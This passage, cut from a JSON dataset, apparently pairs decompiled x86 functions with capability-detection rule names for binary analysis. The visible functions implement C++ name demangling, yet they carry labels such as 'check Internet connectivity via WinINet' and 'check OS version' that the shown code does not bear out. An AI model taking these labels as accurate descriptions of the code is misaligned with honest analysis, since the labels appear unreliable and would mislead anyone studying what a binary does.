(pcVar13[1] - 0x30U < 10);\n                iVar5 = *(in_EAX + 0x14);\n                if (*(in_EAX + 0x18) <= iVar5) {\n                    return NULL;\n                }\n                puVar12 = iVar5 * 0x10 + *(in_EAX + 0x10);\n                puVar12[1] = 0;\n                *(in_EAX + 0x14) = iVar5 + 1;\n                if (pcVar11 - pcVar14 == 0) {\n                    return NULL;\n                }\n                puVar12[1] = 0;\n                *puVar12 = 0;\n                puVar12[2] = pcVar14;\n                puVar12[3] = pcVar11 - pcVar14;\n                cVar10 = pcVar13[1];\n            }\n            else {\n                uVar8 = *(in_EAX + 0x30);\n                *(in_EAX + 0x30) = 1;\n                iVar5 = fcn.0042dff0();\n                *(in_EAX + 0x30) = uVar8;\n                if (iVar5 == 0) {\n                    return NULL;\n                }\n                pcVar11 = *(in_EAX + 0xc);\n                cVar10 = *pcVar11;\n            }\n            pcVar14 = pcVar11;\n            if (cVar10 != '_') {\n                return NULL;\n            }\n        }\n        *(in_EAX + 0xc) = pcVar14 + 1;\n        uVar8 = fcn.0042ed40();\n        piStack32 = fcn.0042d480(uVar8);\n        break;\n    case 0x13:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0042ed40();\n        piStack32 = fcn.0042d480(0);\n        break;\n    case 0x14:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        if (pcVar13[1] == '\\0') {\n            return NULL;\n        }\n        *(in_EAX + 0xc) = pcVar13 + 2;\n    // switch table (49 cases) at 0x525018\n        switch(pcVar13[1]) {\n        case 'F':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x2c;\n            cVar10 = pcVar13[2];\n            *(piVar7 + 3) = cVar10 - 0x30U < 10;\n            if (cVar10 - 0x30U < 10) {\n                fcn.0042d650();\n            }\n            iVar5 = fcn.0042ed40();\n            piVar7[2] = iVar5;\n            if (piVar7[2] == 0) {\n                return NULL;\n            }\n            fcn.0042d650();\n            pcVar13 = *(in_EAX + 0xc);\n            cVar10 = '\\0';\n            if (*pcVar13 != '\\0') {\n                *(in_EAX + 0xc) = pcVar13 + 1;\n                cVar10 = *pcVar13;\n            }\n            *(piVar7 + 0xe) = cVar10 == 's';\n            return piVar7;\n        default:\n            return NULL;\n        case 'T':\n        case 't':\n            uVar8 = *(in_EAX + 0x30);\n            *(in_EAX + 0x30) = 1;\n            fcn.0042dff0();\n            *(in_EAX + 0x30) = uVar8;\n            piStack32 = fcn.0042d480(0);\n            if (piStack32 == NULL) {\n                return NULL;\n            }\n            pcVar13 = *(in_EAX + 0xc);\n            if (*pcVar13 == '\\0') {\n                return NULL;\n            }\n            *(in_EAX + 0xc) = pcVar13 + 1;\n            if (*pcVar13 != 'E') {\n                return NULL;\n            }\n            goto code_r0x0042ee58;\n        case 'a':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                return NULL;\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            *(in_EAX + 0x14) = iVar5 + 1;\n            piVar7[1] = 0;\n            *piVar7 = 0;\n            piVar7[2] = \"auto\";\n            piVar7[3] = 4;\n            return piVar7;\n        case 'c':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                return NULL;\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            *(in_EAX + 0x14) = iVar5 + 1;\n            piVar7[1] = 0;\n            *piVar7 = 0;\n            piVar7[2] = \"decltype(auto)\";\n            piVar7[3] = 0xe;\n            return piVar7;\n        case 'd':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x52639c;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n            return piVar7;\n        case 'e':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x5263b0;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 10;\n            return piVar7;\n        case 'f':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x526388;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n            return piVar7;\n        case 'h':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x5263c4;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 4;\n            return piVar7;\n        case 'i':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x5263ec;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 8;\n            return piVar7;\n        case 'n':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x526400;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 0x11;\n            return piVar7;\n        case 'p':\n            fcn.0042ed40();\n            piStack32 = fcn.0042d480(0);\n            break;\n        case 's':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x5263d8;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 8;\n            return piVar7;\n        case 'v':\n            if (pcVar13[2] == '_') {\n                uVar8 = *(in_EAX + 0x30);\n                *(in_EAX + 0x30) = 1;\n                *(in_EAX + 0xc) = pcVar13 + 3;\n                iVar5 = fcn.0042dff0();\n                *(in_EAX + 0x30) = uVar8;\n            }\n            else {\n                iVar5 = fcn.0042d710();\n            }\n            if (iVar5 == 0) {\n                return NULL;\n            }\n            if (**(in_EAX + 0xc) != '_') {\n                return NULL;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            uVar8 = fcn.0042ed40();\n            piStack32 = fcn.0042d480(uVar8);\n        }\n        break;\n    case 0x16:\n        piStack32 = fcn.0042fb60();\n        break;\n    case 0x17:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0042ed40();\n        piStack32 = fcn.0042d480(0);\n        break;\n    case 0x1d:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        iVar5 = fcn.0042ed40();\n        if (iVar5 == 0) {\n            return NULL;\n        }\n        iVar5 = fcn.0042ed40();\n        if (iVar5 == 0) {\n            return NULL;\n        }\n        piStack32 = fcn.0042d480(iVar5);\n        break;\n    case 0x1f:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0042ed40();\n        piStack32 = fcn.0042d480(0);\n        break;\n    case 0x20:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0042ed40();\n        piStack32 = fcn.0042d480(0);\n        break;\n    case 0x22:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0042ed40();\n        piStack32 = fcn.0042d480(0);\n        break;\n    case 0x23:\n        cVar10 = pcVar13[1];\n        if (((9 < cVar10 - 0x30U) && (cVar10 != '_')) && (0x19 < cVar10 + 0xbfU)) {\n            piStack32 = fcn.0042e860();\n            if (piStack32 == NULL) {\n                return NULL;\n            }\n            if (*piStack32 == 0x18) {\n                return piStack32;\n            }\n            goto code_r0x0042ee58;\n        }\n        piVar7 = fcn.0042d9c0();\n        pcVar13 = *(in_EAX + 0xc);\n        if (*pcVar13 != 'I') {\n            return piVar7;\n        }\ncode_r0x0042ef92:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        uVar8 = fcn.0042e720();\ncode_r0x0042ef9c:\n        piStack32 = fcn.0042d480(uVar8);\n        break;\n    case 0x24:\n        piStack32 = fcn.0042d790();\n        pcVar13 = *(in_EAX + 0xc);\n        if (*pcVar13 == 'I') {\n            if (*(in_EAX + 0x34) == 0) {\n                if (piStack32 == NULL) {\n                    return NULL;\n                }\n                iVar5 = *(in_EAX + 0x20);\n                if (*(in_EAX + 0x24) <= iVar5) {\n                    return NULL;\n                }\n                *(*(in_EAX + 0x1c) + iVar5 * 4) = piStack32;\n                *(in_EAX + 0x20) = iVar5 + 1;\n                uVar8 = 0;\n                if (*pcVar13 + 0xb7U < 2) goto code_r0x0042ef92;\n                goto code_r0x0042ef9c;\n            }\n            uVar8 = *(in_EAX + 0x2c);\n            uVar3 = *(in_EAX + 0x14);\n            uVar4 = *(in_EAX + 0x20);\n            *(in_EAX + 0xc) = pcVar13 + 1;\n            uVar9 = fcn.0042e720();\n            if (**(in_EAX + 0xc) == 'I') {\n                if (piStack32 == NULL) {\n                    return NULL;\n                }\n                iVar5 = *(in_EAX + 0x20);\n                if (*(in_EAX + 0x24) <= iVar5) {\n                    return NULL;\n                }\n                *(*(in_EAX + 0x1c) + iVar5 * 4) = piStack32;\n                *(in_EAX + 0x20) = iVar5 + 1;\n                piStack32 = fcn.0042d480(uVar9);\n            }\n            else {\n                *(in_EAX + 0xc) = pcVar13;\n                *(in_EAX + 0x14) = uVar3;\n                *(in_EAX + 0x2c) = uVar8;\n                *(in_EAX + 0x20) = uVar4;\n            }\n        }\n        break;\n    case 0x25:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        uVar8 = fcn.0042d7f0();\n        if (**(in_EAX + 0xc) == 'I') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            uVar8 = fcn.0042e720();\n            uVar8 = fcn.0042d480(uVar8);\n        }\n        fcn.0042ed40();\n        piStack32 = fcn.0042d480(uVar8);\n        break;\n    case 0x31:\n    case 0x32:\n    case 0x33:\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n    case 0x43:\n    case 0x44:\n    case 0x46:\n    case 0x47:\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n        iVar2 = *(in_EAX + 0x14);\n        iVar5 = (*pcVar13 * 5 + -0x1e5) * 4;\n        if (*(in_EAX + 0x18) <= iVar2) {\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        piVar7 = iVar2 * 0x10 + *(in_EAX + 0x10);\n        piVar7[1] = 0;\n        *(in_EAX + 0x14) = iVar2 + 1;\n        iVar2 = *(iVar5 + 0x526184);\n        *piVar7 = 0x27;\n        piVar7[2] = iVar5 + 0x526180;\n        *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + iVar2;\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        return piVar7;\n    case 0x45:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0042d7f0();\n        piStack32 = fcn.0042d480(0);\n    }\n    if (piStack32 != NULL) {\ncode_r0x0042ee58:\n        iVar5 = *(in_EAX + 0x20);\n        if (iVar5 < *(in_EAX + 0x24)) {\n            *(*(in_EAX + 0x1c) + iVar5 * 4) = piStack32;\n            *(in_EAX + 0x20) = iVar5 + 1;\n            return piStack32;\n        }\n    }\ncode_r0x0042edb3:\n    return NULL;\n}\n",
        "token_count": 5097
    },
    "0042f640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * fcn.0042f640(void)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint *puVar5;\n    char cVar6;\n    int32_t iVar7;\n    char cVar8;\n    bool bVar9;\n    bool bVar10;\n    int32_t iStack36;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    if (*pcVar1 == '\\0') {\n        cVar8 = '\\0';\n    }\n    else {\n        *(in_EAX + 0xc) = pcVar1 + 1;\n        cVar8 = *pcVar1;\n        if (pcVar1[1] != '\\0') {\n            *(in_EAX + 0xc) = pcVar1 + 2;\n            cVar6 = pcVar1[1];\n            if (cVar8 == 'v') {\n                if (cVar6 - 0x30U < 10) {\n                    iVar4 = fcn.0042d7f0();\n                    iVar7 = *(in_EAX + 0x14);\n                    if (*(in_EAX + 0x18) <= iVar7) {\n                        return NULL;\n                    }\n                    puVar5 = iVar7 * 0x10 + *(in_EAX + 0x10);\n                    puVar5[1] = 0;\n                    *(in_EAX + 0x14) = iVar7 + 1;\n                    if (iVar4 == 0) {\n                        return NULL;\n                    }\n                    puVar5[1] = 0;\n                    *puVar5 = 0x32;\n                    puVar5[3] = iVar4;\n                    puVar5[2] = cVar6 + -0x30;\n                    return puVar5;\n                }\n            }\n            else if ((cVar8 == 'c') && (cVar6 == 'v')) {\n                uVar2 = *(in_EAX + 0x34);\n                *(in_EAX + 0x34) = *(in_EAX + 0x30) == 0;\n                fcn.0042ed40();\n                if (*(in_EAX + 0x34) == 0) {\n                    puVar5 = fcn.0042d480(0);\n                }\n                else {\n                    puVar5 = fcn.0042d480(0);\n                }\n                *(in_EAX + 0x34) = uVar2;\n                return puVar5;\n            }\n            goto code_r0x0042f66a;\n        }\n    }\n    cVar6 = '\\0';\ncode_r0x0042f66a:\n    iVar7 = 0;\n    iStack36 = 0x43;\n    do {\n        iVar4 = (iStack36 - iVar7) / 2 + iVar7;\n        pcVar1 = *(iVar4 * 0x10 + 0x525c00);\n        bVar10 = SBORROW1(*pcVar1, cVar8);\n        cVar3 = *pcVar1 - cVar8;\n        bVar9 = *pcVar1 == cVar8;\n        if (bVar9) {\n            bVar10 = SBORROW1(pcVar1[1], cVar6);\n            cVar3 = pcVar1[1] - cVar6;\n            bVar9 = cVar3 == '\\0';\n            if (bVar9) {\n                iVar7 = *(in_EAX + 0x14);\n                if (*(in_EAX + 0x18) <= iVar7) {\n                    return NULL;\n                }\n                puVar5 = iVar7 * 0x10 + *(in_EAX + 0x10);\n                puVar5[1] = 0;\n                *(in_EAX + 0x14) = iVar7 + 1;\n                *puVar5 = 0x31;\n                puVar5[2] = iVar4 * 0x10 + 0x525c00;\n                return puVar5;\n            }\n        }\n        if (bVar9 || bVar10 != cVar3 < '\\0') {\n            iVar7 = iVar4 + 1;\n            iVar4 = iStack36;\n        }\n        iStack36 = iVar4;\n    } while (iVar7 != iStack36);\n    return NULL;\n}\n",
        "token_count": 958
    },
    "0042f8d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __fastcall fcn.0042f8d0(uint32_t param_1, int32_t **param_2)\n\n{\n    int32_t **ppiVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *pcVar4;\n    uint uVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    int32_t *piVar7;\n    \n    pcVar4 = *(in_EAX + 0xc);\n    cVar2 = *pcVar4;\n    iVar6 = fcn.0042dc10();\n    ppiVar1 = param_2;\n    do {\n        if (iVar6 == 0) {\n            if ((((param_1 & 1) == 0) && (cVar2 == 'F')) && (ppiVar1 != param_2)) {\n                piVar7 = *param_2;\n                iVar6 = *piVar7;\n                if (iVar6 != 0x1a) goto code_r0x0042facd;\n                do {\n                    *piVar7 = 0x1d;\n                    while( true ) {\n                        if (ppiVar1 == piVar7 + 2) {\n                            return ppiVar1;\n                        }\n                        piVar7 = piVar7[2];\n                        iVar6 = *piVar7;\n                        if (iVar6 == 0x1a) break;\ncode_r0x0042facd:\n                        if (iVar6 == 0x1b) {\n                            *piVar7 = 0x1e;\n                        }\n                        else if (iVar6 == 0x19) {\n                            *piVar7 = 0x1c;\n                        }\n                    }\n                } while( true );\n            }\n            return ppiVar1;\n        }\n        *(in_EAX + 0xc) = pcVar4 + 1;\n        if (cVar2 == 'r') {\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n            iVar6 = 0;\n        }\n        else if (cVar2 == 'V') {\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n            iVar6 = 0;\n        }\n        else if (cVar2 == 'K') {\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 6;\n            iVar6 = 0;\n        }\n        else {\n            if (pcVar4[1] == '\\0') {\n                return NULL;\n            }\n            *(in_EAX + 0xc) = pcVar4 + 2;\n            uVar3 = pcVar4[1];\n            if (uVar3 == 0x78) {\n                *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 0x11;\n                iVar6 = 0;\n            }\n            else if ((uVar3 & 0xdf) == 0x4f) {\n                *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n                if (uVar3 == 0x4f) {\n                    uVar5 = *(in_EAX + 0x30);\n                    *(in_EAX + 0x30) = 1;\n                    iVar6 = fcn.0042dff0();\n                    *(in_EAX + 0x30) = uVar5;\n                    if (iVar6 == 0) {\n                        return NULL;\n                    }\n                    if (**(in_EAX + 0xc) != 'E') {\n                        return NULL;\n                    }\n                    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                }\n                else {\n                    iVar6 = 0;\n                }\n            }\n            else {\n                if (uVar3 != 0x77) {\n                    return NULL;\n                }\n                *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 6;\n                iVar6 = fcn.0042f7f0();\n                if (iVar6 == 0) {\n                    return NULL;\n                }\n                if (**(in_EAX + 0xc) != 'E') {\n                    return NULL;\n                }\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            }\n        }\n        piVar7 = fcn.0042d480(iVar6);\n        *ppiVar1 = piVar7;\n        if (piVar7 == NULL) {\n            return NULL;\n        }\n        pcVar4 = *(in_EAX + 0xc);\n        ppiVar1 = piVar7 + 2;\n        cVar2 = *pcVar4;\n        iVar6 = fcn.0042dc10();\n    } while( true );\n}\n",
        "token_count": 1084
    },
    "0042fbd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.0042fbd0(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint uVar4;\n    int32_t in_EAX;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t *piVar10;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint8_t *puVar11;\n    uint unaff_EDI;\n    uint8_t *puVar12;\n    bool bVar13;\n    bool bVar14;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    cVar3 = *pcVar1;\n    if (cVar3 - 0x30U < 10) {\n        puVar5 = fcn.0042d7f0();\n        cVar3 = **(in_EAX + 0xc);\n        goto joined_r0x0042fce1;\n    }\n    if (cVar3 + 0x9fU < 0x1a) {\n        if ((cVar3 == 'o') && (pcVar1[1] == 'n')) {\n            *(in_EAX + 0xc) = pcVar1 + 2;\n        }\n        puVar5 = fcn.0042f640();\n        if (puVar5 != NULL) {\n            bVar13 = *puVar5 < 0x31;\n            bVar14 = *puVar5 == 0x31;\n            if (bVar14) {\n                puVar11 = *puVar5[2];\n                iVar9 = 3;\n                *(in_EAX + 0x2c) = puVar5[2][2] + *(in_EAX + 0x2c) + 7;\n                puVar12 = 0x5250dc;\n                do {\n                    if (iVar9 == 0) break;\n                    iVar9 = iVar9 + -1;\n                    bVar13 = *puVar11 < *puVar12;\n                    bVar14 = *puVar11 == *puVar12;\n                    puVar11 = puVar11 + 1;\n                    puVar12 = puVar12 + 1;\n                } while (bVar14);\n                if ((!bVar13 && !bVar14) == bVar13) {\n                    uVar7 = fcn.0042d7f0();\n                    puVar5 = fcn.0042d480(uVar7);\n                }\n            }\n        }\n    }\n    else {\n        if (cVar3 + 0xbdU < 2) {\n            piVar10 = *(in_EAX + 0x28);\n            if ((piVar10 == NULL) || ((*piVar10 != 0 && (*piVar10 != 0x18)))) {\n                if (cVar3 == 'D') {\ncode_r0x0042fe39:\n    // switch table (6 cases) at 0x5250e0\n                    switch(pcVar1[1]) {\n                    case '0':\n                        uVar6 = 1;\n                        break;\n                    case '1':\n                        uVar6 = 2;\n                        break;\n                    case '2':\n                        uVar6 = 3;\n                        break;\n                    default:\n                        goto code_r0x0042fd72;\n                    case '4':\n                        uVar6 = 4;\n                        break;\n                    case '5':\n                        uVar6 = 5;\n                    }\n                    *(in_EAX + 0xc) = pcVar1 + 2;\n                    iVar9 = *(in_EAX + 0x14);\n                    if (iVar9 < *(in_EAX + 0x18)) {\n                        puVar5 = iVar9 * 0x10 + *(in_EAX + 0x10);\n                        puVar5[1] = 0;\n                        *(in_EAX + 0x14) = iVar9 + 1;\n                        if (piVar10 != NULL) {\n                            puVar5[1] = 0;\n                            *puVar5 = 8;\n                            puVar5[2] = uVar6;\n                            puVar5[3] = piVar10;\n                            cVar3 = pcVar1[2];\n                            goto joined_r0x0042fce1;\n                        }\n                    }\n                    cVar3 = pcVar1[2];\n                    goto code_r0x0042fec4;\n                }\n            }\n            else {\n                *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + piVar10[3];\n                cVar3 = *pcVar1;\n                if (cVar3 != 'C') {\n                    if (cVar3 == 'D') goto code_r0x0042fe39;\ncode_r0x0042fec4:\n                    puVar5 = NULL;\n                    goto joined_r0x0042fce1;\n                }\n            }\n            if (pcVar1[1] == 'I') {\n                *(in_EAX + 0xc) = pcVar1 + 1;\n                cVar3 = pcVar1[2];\n                if (4 < cVar3 - 0x31U) {\n                    cVar3 = pcVar1[1];\n                    puVar5 = NULL;\n                    goto joined_r0x0042fce1;\n                }\n                *(in_EAX + 0xc) = pcVar1 + 3;\n                uVar6 = *((cVar3 - 0x31U) * 4 + 0x5257f8);\n                fcn.0042ed40();\n                piVar10 = *(in_EAX + 0x28);\n            }\n            else {\n                uVar2 = pcVar1[1] - 0x31;\n                if (4 < uVar2) {\ncode_r0x0042fd72:\n                    return NULL;\n                }\n                *(in_EAX + 0xc) = pcVar1 + 2;\n                uVar6 = *(uVar2 * 4 + 0x5257f8);\n            }\n            iVar9 = *(in_EAX + 0x14);\n            if (iVar9 < *(in_EAX + 0x18)) {\n                puVar5 = iVar9 * 0x10 + *(in_EAX + 0x10);\n                puVar5[1] = 0;\n                *(in_EAX + 0x14) = iVar9 + 1;\n                if ((piVar10 != NULL) && (uVar6 - 1 < 5)) {\n                    puVar5[1] = 0;\n                    *puVar5 = 7;\n                    puVar5[2] = uVar6;\n                    puVar5[3] = piVar10;\n                    goto code_r0x0042fc11;\n                }\n            }\ncode_r0x0042ff70:\n            puVar5 = NULL;\n            cVar3 = **(in_EAX + 0xc);\n            goto joined_r0x0042fce1;\n        }\n        if (cVar3 == 'L') {\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            puVar5 = fcn.0042d7f0();\n            if (puVar5 == NULL) {\n                return NULL;\n            }\n            iVar9 = fcn.0042dc60();\n            if (iVar9 == 0) {\n                return NULL;\n            }\n        }\n        else {\n            if (cVar3 != 'U') {\n                return NULL;\n            }\n            if (pcVar1[1] == 'l') {\n                puVar5 = NULL;\n                *(in_EAX + 0xc) = pcVar1 + 1;\n                cVar3 = pcVar1[1];\n                if (cVar3 != 'l') goto joined_r0x0042fce1;\n                *(in_EAX + 0xc) = pcVar1 + 2;\n                uVar6 = fcn.0042f7f0();\n                if (uVar6 == 0) goto code_r0x0042fc11;\n                cVar3 = **(in_EAX + 0xc);\n                if (cVar3 != 'E') goto joined_r0x0042fce1;\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                uVar8 = fcn.0042d750();\n                if (-1 < uVar8) {\n                    iVar9 = *(in_EAX + 0x14);\n                    pcVar1 = *(in_EAX + 0xc);\n                    if (iVar9 < *(in_EAX + 0x18)) {\n                        puVar5 = iVar9 * 0x10 + *(in_EAX + 0x10);\n                        puVar5[1] = 0;\n                        *(in_EAX + 0x14) = iVar9 + 1;\n                        puVar5[3] = uVar8;\n                        iVar9 = *(in_EAX + 0x20);\n                        *puVar5 = 0x45;\n                        puVar5[2] = uVar6;\n                        if (iVar9 < *(in_EAX + 0x24)) {\n                            *(*(in_EAX + 0x1c) + iVar9 * 4) = puVar5;\n                            *(in_EAX + 0x20) = iVar9 + 1;\n                            cVar3 = *pcVar1;\n                            goto joined_r0x0042fce1;\n                        }\n                    }\n                    cVar3 = *pcVar1;\n                    puVar5 = NULL;\n                    goto joined_r0x0042fce1;\n                }\n                goto code_r0x0042ff70;\n            }\n            if (pcVar1[1] != 't') {\n                return NULL;\n            }\n            puVar5 = NULL;\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            cVar3 = pcVar1[1];\n            if (cVar3 != 't') goto joined_r0x0042fce1;\n            *(in_EAX + 0xc) = pcVar1 + 2;\n            uVar6 = fcn.0042d750();\n            if (-1 < uVar6) {\n                iVar9 = *(in_EAX + 0x14);\n                if (iVar9 < *(in_EAX + 0x18)) {\n                    puVar5 = iVar9 * 0x10 + *(in_EAX + 0x10);\n                    puVar5[1] = 0;\n                    *(in_EAX + 0x14) = iVar9 + 1;\n                    pcVar1 = *(in_EAX + 0xc);\n                    puVar5[2] = uVar6;\n                    iVar9 = *(in_EAX + 0x20);\n                    *puVar5 = 0x47;\n                    if (iVar9 < *(in_EAX + 0x24)) {\n                        *(*(in_EAX + 0x1c) + iVar9 * 4) = puVar5;\n                        *(in_EAX + 0x20) = iVar9 + 1;\n                        cVar3 = *pcVar1;\n                    }\n                    else {\n                        cVar3 = *pcVar1;\n                        puVar5 = NULL;\n                    }\n                    goto joined_r0x0042fce1;\n                }\n                goto code_r0x0042ff70;\n            }\n        }\n    }\ncode_r0x0042fc11:\n    cVar3 = **(in_EAX + 0xc);\njoined_r0x0042fce1:\n    if (cVar3 == 'B') {\n        uVar7 = *(in_EAX + 0x28);\n        pcVar1 = *(in_EAX + 0xc);\n        cVar3 = *pcVar1;\n        while (cVar3 == 'B') {\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            uVar4 = fcn.0042d7f0();\n            puVar5 = fcn.0042d480(uVar4, unaff_EBX, unaff_ESI, unaff_EDI);\n            pcVar1 = *(in_EAX + 0xc);\n            cVar3 = *pcVar1;\n        }\n        *(in_EAX + 0x28) = uVar7;\n        return puVar5;\n    }\n    return puVar5;\n}\n",
        "token_count": 2720
    },
    "0042ffd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
